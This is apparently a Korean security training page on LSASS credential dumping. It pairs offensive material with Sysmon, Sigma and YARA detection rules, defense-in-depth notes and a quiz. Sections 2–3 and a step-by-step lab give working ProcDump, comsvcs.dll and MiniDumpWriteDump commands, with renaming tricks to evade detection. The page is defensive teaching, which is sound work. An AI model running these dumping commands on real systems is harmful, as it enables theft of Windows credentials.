#1. Mimikatz 핵심 코드 분석

🔧

Mimikatz의 sekurlsa 모듈

Benjamin Delpy가 개발한 Mimikatz는 Windows 자격증명 보안 연구의 핵심 도구입니다. sekurlsa 모듈은 LSASS 프로세스 메모리에서 인증 정보를 추출하는 역할을 합니다. 핵심 API 호출: OpenProcess() → ReadProcessMemory() → 자격증명 구조체 파싱.

mimikatz_sekurlsa.c
C
⚠️ 교육 목적 코드 — 교육 목적 의사 코드 — 실제 코드와 다릅니다
// Mimikatz sekurlsa::logonpasswords 핵심 로직 (의사 코드)
HANDLE hProcess = OpenProcess(
PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
FALSE,
lsassPid // LSASS 프로세스 ID
);
// LSASS 메모리에서 인증 패키지 구조체 탐색
for (pkg in authPackages) { // MSV1_0, Kerberos, WDigest...
ReadProcessMemory(hProcess, pkg->listAddr, &logonList);
// 각 로그온 세션에서 자격증명 추출
foreach (session in logonList) {
decryptCredential(session->credential, lsaKey);
printf("User: %s\nNTLM: %s\n", session->user, ntlmHash);
}
}

#2. ProcDump를 이용한 Living-off-the-Land

🎭

합법적 도구의 악용 (LotL)

Living-off-the-Land(LotL) 기법은 시스템에 이미 존재하거나 합법적으로 배포된 도구를 공격에 활용하는 전략입니다. ProcDump는 Microsoft Sysinternals Suite에 포함된 공식 진단 도구이므로, 대부분의 안티바이러스가 이를 차단하지 않습니다.

procdump_lsass.bat
batch
⚠️ 교육 목적 코드 — 교육 목적 명령어 — 허가된 환경에서만 실행
REM ProcDump를 이용한 LSASS 메모리 덤프
REM 전제조건: 관리자 권한 CMD
REM 방법 1: 프로세스 이름으로 덤프
procdump.exe -ma lsass.exe lsass_dump.dmp
REM 방법 2: PID로 덤프 (탐지 우회 시도)
for /f "tokens=2" %%i in ('tasklist /FI "IMAGENAME eq lsass.exe" ^| findstr lsass') do (
procdump.exe -ma %%i C:\temp\debug.dmp -accepteula
)
REM 방법 3: 파일명 변경하여 탐지 우회
copy procdump.exe debug_tool.exe
debug_tool.exe -ma lsass.exe output.dmp
comsvcs_dump.bat
batch
⚠️ 교육 목적 코드 — Windows 내장 DLL 악용 — 교육 목적
REM comsvcs.dll 내장 MiniDump 함수 악용
REM Windows에 기본 포함된 DLL이므로 추가 도구 불필요
REM 1단계: LSASS PID 확인
tasklist /FI "IMAGENAME eq lsass.exe"
REM 2단계: rundll32를 통한 MiniDump 호출
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ^
<LSASS_PID> C:\temp\lsass.dmp full
REM PowerShell 원라이너 버전
$pid = (Get-Process lsass).Id
rundll32.exe comsvcs.dll, MiniDump $pid dump.dmp full

#3. Windows API 호출 분석

🔌

핵심 Windows API

LSASS 메모리 덤프에 사용되는 핵심 Windows API: ① OpenProcess() — 대상 프로세스 핸들 획득. PROCESS_VM_READ 권한 필요. ② MiniDumpWriteDump() — DbgHelp.dll의 함수. 프로세스 메모리를 파일로 저장. ③ NtReadVirtualMemory() — NT Native API. 더 낮은 수준의 메모리 읽기.

minidump_api.c
C
⚠️ 교육 목적 코드 — API 호출 패턴 분석용 — 교육 목적
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")
// LSASS PID 획득
DWORD lsassPid = GetLsassPid(); // tasklist 또는 EnumProcesses
// 프로세스 핸들 획득
HANDLE hProc = OpenProcess(
PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
FALSE, lsassPid);
// 출력 파일 생성
HANDLE hFile = CreateFile(L"lsass.dmp", GENERIC_WRITE,
0, NULL, CREATE_ALWAYS, 0, NULL);
// 전체 메모리 덤프 (MiniDumpWithFullMemory)
BOOL ok = MiniDumpWriteDump(
hProc, lsassPid, hFile,
MiniDumpWithFullMemory, // 전체 메모리 포함
NULL, NULL, NULL);

#4. Sysmon 기반 탐지 규칙

📡

Sysmon Event ID 10: ProcessAccess

Sysmon의 Event ID 10은 한 프로세스가 다른 프로세스의 메모리에 접근할 때 발생합니다. TargetImage 필드가 lsass.exe이고, GrantedAccess에 0x1010(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) 이상의 권한이 포함되면 의심 대상입니다.

sysmon-config.xml
xml
⚠️ 교육 목적 코드 — 실제 환경에서 실행하지 마세요
<!-- Sysmon 설정: LSASS 메모리 접근 탐지 -->
<Sysmon schemaversion="4.90">
<EventFiltering>
<!-- LSASS 프로세스 접근 감시 -->
<ProcessAccess onmatch="include">
<TargetImage condition="is">
C:\Windows\System32\lsass.exe
</TargetImage>
</ProcessAccess>
<!-- 신뢰할 수 있는 프로세스 제외 -->
<ProcessAccess onmatch="exclude">
<SourceImage condition="is">
C:\Windows\System32\svchost.exe
</SourceImage>
<SourceImage condition="is">
C:\Windows\System32\csrss.exe
</SourceImage>
</ProcessAccess>
</EventFiltering>
</Sysmon>

#5. Sigma 탐지 규칙 작성

📋

Sigma 규칙이란?

Sigma는 SIEM 벤더에 독립적인 탐지 규칙 형식입니다. YAML로 작성되며, Splunk, Elasticsearch, Microsoft Sentinel 등 다양한 SIEM으로 변환할 수 있습니다. LSASS 메모리 접근을 탐지하는 Sigma 규칙을 작성하면 어떤 SIEM 환경에서든 활용 가능합니다.

lsass_access.yml
yaml
⚠️ 교육 목적 코드 — 실제 환경에서 실행하지 마세요
title: Suspicious LSASS Process Access
id: 0d894093-71bc-43c3-a4cf-de7d2c37a8b2
status: production
level: high
description: >
Detects suspicious access to LSASS process memory
commonly used for credential dumping
logsource:
category: process_access
product: windows
detection:
selection:
TargetImage|endswith: '\lsass.exe'
GrantedAccess|contains:
- '0x1010' # VM_READ + QUERY_INFO
- '0x1410' # + QUERY_LIMITED
- '0x1F0FFF' # FULL ACCESS
filter_system:
SourceImage|startswith:
- 'C:\Windows\System32\'
condition: selection and not filter_system

⚠️ 공격자의 탐지 우회 전략

실무에서 공격자는 기본 탐지를 우회하기 위해 다양한 기법을 사용합니다. 방어자는 이러한 우회 기법을 이해해야 더 효과적인 탐지 규칙을 작성할 수 있습니다.

주요 탐지 우회 기법과 대응

우회 기법 원리 대응 방법

#7. YARA 규칙으로 도구 탐지

🎯

YARA 규칙 기반 탐지

YARA는 파일 및 메모리에서 악성코드 패턴을 탐지하는 규칙 엔진입니다. Mimikatz와 같은 도구는 특유의 문자열과 바이너리 패턴을 가지고 있어, 파일명을 변경하더라도 YARA 규칙으로 탐지할 수 있습니다.

detect_mimikatz.yar
yara
⚠️ 교육 목적 코드 — 실제 환경에서 실행하지 마세요
rule Mimikatz_Strings {
meta:
author = "ROOT14 EDU"
description = "Detects Mimikatz by string patterns"
severity = "critical"
strings:
$s1 = "sekurlsa::logonpasswords" ascii wide
$s2 = "gentilkiwi" ascii // 개발자 이름
$s3 = "mimikatz" ascii wide nocase
$s4 = "lsadump::" ascii wide
$api1 = "MiniDumpWriteDump" ascii
$api2 = "OpenProcess" ascii
condition:
(2 of ($s*)) or ($api1 and $api2 and 1 of ($s*))
}

#8. 방어 아키텍처: 다층 방어

🏰

Defense-in-Depth 전략

단일 방어 메커니즘은 언제나 우회될 수 있습니다. 효과적인 LSASS 보호를 위해서는 다층 방어(Defense-in-Depth) 전략이 필요합니다: 예방 계층(Credential Guard + PPL) → 탐지 계층(Sysmon + Sigma + YARA) → 대응 계층(자동화된 격리 + 포렌식).

다층 방어 아키텍처

  ├─────────────────────────────────────────────┤
  │              Layer 2: 탐지 (Detection)        │

mini-lab-2.sh

공격자의 ProcDump 기반 LSASS 덤프 과정을 단계별로 따라가 보세요.

1️⃣
관리자 권한 CMD 실행
공격자는 먼저 관리자 권한의 명령 프롬프트를 확보합니다. 이를 위해 UAC 우회 또는 권한 상승 취약점을 사용합니다.
2️⃣
ProcDump 다운로드/전송
Microsoft Sysinternals에서 ProcDump를 다운로드하거나, 이미 시스템에 있는 경우 그대로 사용합니다. 합법적 도구이므로 AV 탐지를 회피합니다.
3️⃣
LSASS PID 확인
tasklist /FI "IMAGENAME eq lsass.exe" 명령으로 LSASS 프로세스 ID를 확인합니다.
4️⃣
메모리 덤프 실행
procdump.exe -ma <PID> lsass.dmp -accepteula 명령으로 전체 메모리를 덤프합니다. -ma 옵션은 전체 메모리를 포함합니다.
5️⃣
덤프 파일 외부 전송
생성된 .dmp 파일을 C2 서버로 전송하거나, USB 드라이브로 복사합니다. 이후 오프라인에서 분석합니다.
6️⃣
Mimikatz로 오프라인 분석
공격자의 시스템에서 mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' 명령으로 자격증명을 추출합니다.

#Q. 종합 퀴즈

Q1. Mimikatz가 LSASS에서 자격증명을 추출할 때 사용하는 핵심 Windows API 조합은?

💡 Mimikatz는 OpenProcess()로 LSASS 프로세스 핸들을 획득한 후, ReadProcessMemory()로 메모리를 읽어 인증 구조체를 파싱합니다. PROCESS_VM_READ 권한이 필수입니다.

Q2. comsvcs.dll을 이용한 LSASS 덤프가 탐지하기 어려운 이유는?

💡 comsvcs.dll은 Windows에 기본 포함된 합법적 DLL로, rundll32.exe를 통해 MiniDump 기능을 호출합니다. 서명된 Microsoft 파일이므로 대부분의 AV/EDR이 기본 상태에서 차단하지 않습니다.

Q3. Sysmon Event ID 10에서 LSASS 접근을 탐지할 때 확인해야 할 핵심 필드는?

💡 Event ID 10(ProcessAccess)에서 SourceImage(접근한 프로세스), TargetImage(lsass.exe), GrantedAccess(요청한 권한)를 조합하여 비정상적 접근을 탐지합니다.

Q4. Direct Syscall 기법이 일반적인 API 모니터링을 우회할 수 있는 이유는?

💡 일반적으로 API 모니터링 도구(EDR)는 ntdll.dll의 함수를 후킹합니다. Direct Syscall은 ntdll.dll을 우회하여 시스템 콜 번호로 커널을 직접 호출하므로 이러한 후킹을 회피합니다.

Q5. YARA 규칙에서 Mimikatz를 탐지할 때 파일명 변경 우회를 방지하는 방법은?

💡 YARA 규칙은 파일 내부의 고유 문자열(예: 'sekurlsa::logonpasswords', 'gentilkiwi')이나 바이너리 패턴을 매칭합니다. 파일명을 변경해도 내부 코드는 동일하므로 여전히 탐지됩니다.
